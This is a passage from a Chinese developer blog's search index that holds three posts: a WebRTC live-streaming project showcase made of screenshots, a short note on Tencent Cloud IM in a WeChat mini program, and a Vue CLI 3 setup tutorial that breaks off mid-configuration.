<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>webRTC实时音视频直播</title>
      <link href="2021/02/24/webRTC/"/>
      <url>2021/02/24/webRTC/</url>
      
        <content type="html"><![CDATA[<div class="note quote"><p>因整个直播相关业务较为庞大并且都是博主独立负责开发，涵盖主播及用户和不同端以及不同的直播模式(1v1 1v6 视频、课件H5直播等)以满足不同需求及场景，以及目前在着手忙公司其他项目上线，就先展现下项目最终效果 后期会整理出详细的代码实现过程，如有兴趣可以联系我邮箱期待与你分享，加油打工人~</p></div><h3 id="webRTC项目最终实现展示"><a href="#webRTC项目最终实现展示" class="headerlink" title="webRTC项目最终实现展示"></a>webRTC项目最终实现展示</h3><div class="tabs" id="tab-id"><ul class="nav-tabs"><li class="tab active"><a class="#tab-id-1">主播（讲师）推流端</a></li><li class="tab"><a class="#tab-id-2">1对1实时音视频直播</a></li><li class="tab"><a class="#tab-id-3">小程序直播</a></li></ul><div class="tab-content"><div class="tab-pane active" id="tab-id-1"><div class="gallery ">               <!--图片预览--><p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/rtc_teacher1.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/rtc_teacher1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step1"></p>            </div><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/rtc_teacher2.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/rtc_teacher2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step2"></p>            </div><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/rtc_teacher3.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/rtc_teacher3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step3"></p>            </div><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/rtc_teacher4.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/rtc_teacher4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step4"></p>            </div><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/rtc_teacher5.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/rtc_teacher5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step5"></p>            </div></div><div class="tab-pane" id="tab-id-2"><ul><li>这是Anchor <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif" style="height:1.5em"/> 讲师端。<div class="gallery ">            <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_1.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step1"></p>          </div></li></ul><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_2.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step2"></p>            </div><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_3.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step3"></p>            </div><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_4.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step4"></p>            </div><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_5.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step5"></p>            </div><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_6.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step6"></p>            </div><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_7.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step7"></p>            </div><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_8.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step8"></p>            </div><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_9.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/anchor1v1_9.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step9"></p>            </div><ul><li>这是Audience <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif" style="height:40px;"/> 学员端。</li></ul><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/user1v1_1.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/user1v1_1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step1"></p>            </div><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/user1v1_2.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/user1v1_2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step2"></p>            </div><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/user1v1_3.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/user1v1_3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step3"></p>            </div></div><div class="tab-pane" id="tab-id-3"><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/mini_program_live.jpg" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/mini_program_live.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="step1"></p>            </div></div></div></div>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webRTC </tag>
            
            <tag> 实时音视频 </tag>
            
            <tag> 即时通讯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序接入腾讯云IM即时通讯</title>
      <link href="2019/07/21/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%85%A5%E8%85%BE%E8%AE%AF%E4%BA%91IM%E5%8D%B3%E6%97%B6%E9%80%9A%E8%AE%AF/"/>
      <url>2019/07/21/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%85%A5%E8%85%BE%E8%AE%AF%E4%BA%91IM%E5%8D%B3%E6%97%B6%E9%80%9A%E8%AE%AF/</url>
      
        <content type="html"><![CDATA[<h3 id="会话列表功能概述："><a href="#会话列表功能概述：" class="headerlink" title="会话列表功能概述："></a>会话列表功能概述：</h3><ul><li>登录 ：先用自己的账号登录腾讯云；</li><li>获取会话列表 ：登录之后再获取会话列表；</li><li>更新未读消息数量 ：获取会话列表之后更新未读消息数量</li></ul><h3 id="会话列表页效果图-测试截图"><a href="#会话列表页效果图-测试截图" class="headerlink" title="会话列表页效果图(测试截图)"></a>会话列表页效果图(测试截图)</h3><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/WechatIMG2.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/WechatIMG2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="会话列表IM"></p>            </div><h3 id="聊天窗口效果图-测试截图"><a href="#聊天窗口效果图-测试截图" class="headerlink" title="聊天窗口效果图(测试截图)"></a>聊天窗口效果图(测试截图)</h3><div class="gallery ">              <p><img src="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/WechatIMG1.png" class="lazyload" data-srcset="https://blog-1257093177.cos.ap-chengdu.myqcloud.com/WechatIMG1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="聊天窗口效果图IM"></p>            </div><p>这是用腾讯云IM通讯在小程序里面实现即时通讯的效果,已经上线，感兴趣的大佬可以通过邮箱和我联系，相互学习共同进步。</p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 即时通讯 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue3.0初体验有哪些实用新功能</title>
      <link href="2019/04/23/vue3.0%E5%88%9D%E4%BD%93%E9%AA%8C%E6%9C%89%E5%93%AA%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%96%B0%E5%8A%9F%E8%83%BD/"/>
      <url>2019/04/23/vue3.0%E5%88%9D%E4%BD%93%E9%AA%8C%E6%9C%89%E5%93%AA%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%96%B0%E5%8A%9F%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://juejin.im/post/5bb719b9f265da0ab915dbdd">尤雨溪：Vue 3.0 计划</a> 掘金译文</p></blockquote><h3 id="关于安装"><a href="#关于安装" class="headerlink" title="关于安装"></a>关于安装</h3><p>Vue CLI 的包名称由 vue-cli 改成了 @vue/cli</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g @vue/cli</span><br><span class="line"></span><br><span class="line">安装完成后查看版本</span><br><span class="line">vue --V</span><br></pre></td></tr></table></figure><h3 id="项目创建"><a href="#项目创建" class="headerlink" title="项目创建"></a>项目创建</h3><p>关于项目创建，除了命令创建3.x还增加了<strong>图形化界面创建以及管理vue项目</strong><br>在创建新项目时还可以<strong>混合选用多种集成</strong></p><ul><li>TypeScript</li><li>PWA</li><li>Vue Router &amp; Vuex</li><li>ESLint / TSLint / Prettier</li><li>用 Jest 或 Mocha 进行单元测试</li><li>用 Cypress 或者 Nightwatch 进行 E2E 测试</li></ul><h3 id="使用命令创建"><a href="#使用命令创建" class="headerlink" title="使用命令创建"></a>使用命令创建</h3><p>命令：vue create vueapp</p><ol><li>使用上下箭头选择默认设置还是手动选择功能</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Vue CLI v3<span class="number">.0</span><span class="number">.3</span></span><br><span class="line">? Please pick a preset:</span><br><span class="line">  <span class="keyword">default</span> (babel, eslint)</span><br><span class="line">&gt; Manually select features</span><br></pre></td></tr></table></figure><ol start="2"><li>按空格键选择你需要的功能，选完后按回车</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">babel：javascript转译器，将最新版的js语法（es6、es7）转换为现阶段浏览器可以兼容的js代码</span><br><span class="line">typescript：使用 TypeScript 书写源码</span><br><span class="line">PWA：渐进式WEB应用</span><br><span class="line">Router：使用vue-router</span><br><span class="line">Vuex：使用vuex</span><br><span class="line">CSS Pre-processors：css预处理器</span><br><span class="line">Linter / Formatter：代码规范标准</span><br><span class="line">Unit Testing：单元测试</span><br><span class="line">E2E Testing：e2e测试</span><br><span class="line">Vue CLI v3<span class="number">.0</span><span class="number">.3</span></span><br><span class="line">? Please pick a preset: Manually select features</span><br><span class="line">? Check the features needed <span class="keyword">for</span> your project:</span><br><span class="line"> (*) Babel</span><br><span class="line"> ( ) TypeScript</span><br><span class="line"> ( ) Progressive Web App (PWA) Support</span><br><span class="line"> (*) Router</span><br><span class="line"> (*) Vuex</span><br><span class="line">&gt;(*) CSS Pre-processors</span><br><span class="line"> (*) Linter / Formatter</span><br><span class="line"> ( ) Unit Testing</span><br><span class="line"> ( ) E2E Testing</span><br></pre></td></tr></table></figure><ol start="3"><li>router是否使用history模式，history需要服务器支持</li><li>css预处理器的选择，我习惯用sass</li><li>代码格式化检测选择，我用的是ide是vscode个人感觉搭配插件用着很舒服，所以我选Prettier</li><li>是否保存刚才的配置，下一次就不用重新配置了，我就直接回车</li><li>关于Babel, PostCSS, ESLint, etc.这些配置文件你是想放在package.json里面还是单独放在外面<br>编辑器一般默认会在项目根目录下寻找配置文件，这里我就直接回车选择In dedicated config files</li><li>是否保存为未来项目的预配置吗，我也是直接回车</li></ol><p>最后配置如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Vue CLI v3<span class="number">.0</span><span class="number">.3</span></span><br><span class="line">? Please pick a preset: Manually select features</span><br><span class="line">? Check the features needed <span class="keyword">for</span> your project: Babel, Router, Vuex, CSS Pre-processors, Linter</span><br><span class="line">? Use history mode <span class="keyword">for</span> router? (Requires proper server setup <span class="keyword">for</span> index fallback <span class="keyword">in</span> production) No</span><br><span class="line">? Pick a CSS pre-processor (PostCSS, Autoprefixer and CSS Modules are supported by <span class="keyword">default</span>): Sass/SCSS</span><br><span class="line">? Pick a linter / formatter config: Prettier</span><br><span class="line">? Pick additional lint features: Lint on save</span><br><span class="line">? Where <span class="keyword">do</span> you prefer placing config <span class="keyword">for</span> Babel, PostCSS, ESLint, etc.? In dedicated config files</span><br><span class="line">? Save <span class="built_in">this</span> <span class="keyword">as</span> a preset <span class="keyword">for</span> future projects? Yes</span><br></pre></td></tr></table></figure><h3 id="图形化界面"><a href="#图形化界面" class="headerlink" title="图形化界面"></a>图形化界面</h3><p>图形化操作非常方便，我就不一步步演示了，主要懒得贴图 (°ー°〃)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">执行npm命令</span><br><span class="line">vue ui</span><br><span class="line">访问 http:<span class="comment">//localhost:8000 你就可以创建，管理，导入项目</span></span><br></pre></td></tr></table></figure><h3 id="实用新功能"><a href="#实用新功能" class="headerlink" title="实用新功能"></a>实用新功能</h3><ul><li>node_modules</li><li>public</li><li>src</li><li>.browserslistrc</li><li>.eslintrc.js</li><li>.gitignore</li><li>babel.config.js</li><li>package.json</li><li>postcss.config.js</li><li>README.md</li></ul><p>以上是项目根目录，3.x对比2.x文件结构明显精简了不少，多了一个public文件夹用于存放静态文件少了config、build等一系列的配置文件，这些配置文件都被放在了node_modules@vue文件下</p><h3 id="browserslist"><a href="#browserslist" class="headerlink" title="browserslist"></a>browserslist</h3><p>根目录中多了一个.browserslist文件，可以指定项目的目标浏览器的范围<br>用于转译的 JavaScript 特性和添加CSS 浏览器前缀，可以减少兼容代码提高代码质量<br>如果想少一个文件，你也可以在package.json中添加browserslist字段，参数是一个数组</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这是默认设置，兼容所有最新版本，不支持ie8以下</span><br><span class="line">&gt; <span class="number">1</span>%</span><br><span class="line">last <span class="number">2</span> versions</span><br><span class="line">not ie &lt;= <span class="number">8</span></span><br></pre></td></tr></table></figure><p>使用 npx browserslist 可以查看项目的浏览器兼容情况<br>将需要支持的目标浏览器参数放在文件中就好</p><h3 id="vue-cli服务"><a href="#vue-cli服务" class="headerlink" title="vue-cli服务"></a>vue-cli服务</h3><p>在一个 Vue CLI 项目中，@vue/cli-service 安装了一个名为 vue-cli-service 的命令。<br>你可以在 npm scripts 中以 vue-cli-service、或者从终端中以 ./node_modules/.bin/vue-cli-service 访问这个命令<br>Vue CLI 项目有三个模式： development 模式用于启动，production 模式用于打包和e2e测试，test 模式用于unit测试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">启动</span><br><span class="line">serve:vue-cli-service serve</span><br><span class="line"></span><br><span class="line">  --open    在服务器启动时打开浏览器</span><br><span class="line"></span><br><span class="line">  --copy    在服务器启动时将 URL 复制到剪切版</span><br><span class="line"></span><br><span class="line">  --mode    指定环境模式 (默认值：development)</span><br><span class="line"></span><br><span class="line">  --host    指定 host (默认值：<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>)</span><br><span class="line"></span><br><span class="line">  --port    指定 port (默认值：<span class="number">8080</span>)</span><br><span class="line"></span><br><span class="line">  --https   使用 https (默认值：<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line">打包</span><br><span class="line">build:vue-cli-service build</span><br><span class="line"></span><br><span class="line">  --modern 使用现代模式构建应用，为现代浏览器交付原生支持的 ES2015 代码，并生成一个兼容老浏览器的包用来自动回退。</span><br><span class="line"></span><br><span class="line">  --target 允许你将项目中的任何组件以一个库或 Web Components 组件的方式进行构建。更多细节请查阅构建目标。</span><br><span class="line"></span><br><span class="line">  --report 和 --report-json 会根据构建统计生成报告，它会帮助你分析包中包含的模块们的大小</span><br><span class="line"></span><br><span class="line">测试</span><br><span class="line"> test: vue-cli-service test:e2e  端到端测试</span><br><span class="line">         vue-cli-service test:unit  单元测试</span><br></pre></td></tr></table></figure><h3 id="现代模式"><a href="#现代模式" class="headerlink" title="现代模式"></a>现代模式</h3><p>为了兼容那些不支持js新特性的浏览器我们需要Babel转译，但转译后的代码笨重冗长，这次3.x提供了一个现代模式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx vue-cli-service build --modern</span><br></pre></td></tr></table></figure><p>这个命令会产生两个应用的版本：一个现代版的包，面向支持 ES modules 的现代浏览器，另一个旧版的包，面向不支持的旧浏览器<br>而且不需要我们手动去部署和设置什么，简直很贴心</p><ul><li>现代版的包会通过 <code>&lt;script type=&quot;module&quot;&gt; 在被支持的浏览器中加载；它们还会使用 &lt;link rel=&quot;modulepreload&quot;&gt; </code>进行预加载</li><li>旧版的包会通过 <code>&lt;script nomodule&gt; 加载，并会被支持 ES modules</code> 的浏览器忽略</li><li>一个针对 Safari 10 中 <code>&lt;script nomodule&gt;</code> 的修复会被自动注入</li></ul><h3 id="插件的添加"><a href="#插件的添加" class="headerlink" title="插件的添加"></a>插件的添加</h3><p>在一个已经被创建好的项目中安装一个插件,使用vue add命令</p><h3 id="CLI-插件安装"><a href="#CLI-插件安装" class="headerlink" title="CLI 插件安装"></a>CLI 插件安装</h3><p>每个 CLI 插件都会包含一个 (用来创建文件的) 生成器和一个 (用来调整 webpack 核心配置和注入命令的) 运行时插件<br>对于这种cli插件需要加入@vue的前缀，这个命令将 @vue/eslint 解析为完整的包名 @vue/cli-plugin-eslint，然后从 npm 安装它，调用它的生成器</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">插件添加</span><br><span class="line">vue add @vue/eslint</span><br><span class="line"></span><br><span class="line">向被安装的插件传递生成器选项 (这样做会跳过命令提示)</span><br><span class="line">vue add @vue/eslint --config airbnb --lintOn save</span><br></pre></td></tr></table></figure><h3 id="第三方插件安装"><a href="#第三方插件安装" class="headerlink" title="第三方插件安装"></a>第三方插件安装</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">安装并调用 vue-cli-plugin-apollo，不带 @vue 前缀，该命令会换作解析一个 unscoped 的包</span><br><span class="line">执行此命令后src里会创建一个plugins文件夹，里面会自动生成关于插件的配置文件</span><br><span class="line">vue add axios</span><br><span class="line"></span><br><span class="line">基于一个指定的 scope 使用第三方插件，如果一个插件名为 @foo/vue-cli-plugin-bar，你可以这样添加它：</span><br><span class="line">vue add @foo/bar</span><br></pre></td></tr></table></figure><h3 id="配置修改"><a href="#配置修改" class="headerlink" title="配置修改"></a>配置修改</h3><p>例：向所有 Sass 样式传入共享的全局变量<br>在根目录新建一个vue.config.js，加入以下配置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  css: &#123;</span><br><span class="line">    loaderOptions: &#123;</span><br><span class="line">      <span class="comment">// 给 sass-loader 传递选项</span></span><br><span class="line">      sass: &#123;</span><br><span class="line">        <span class="comment">// @/ 是 src/ 的别名</span></span><br><span class="line">        <span class="comment">// 所以这里假设你有 `src/variables.scss` 这个文件</span></span><br><span class="line">        data: 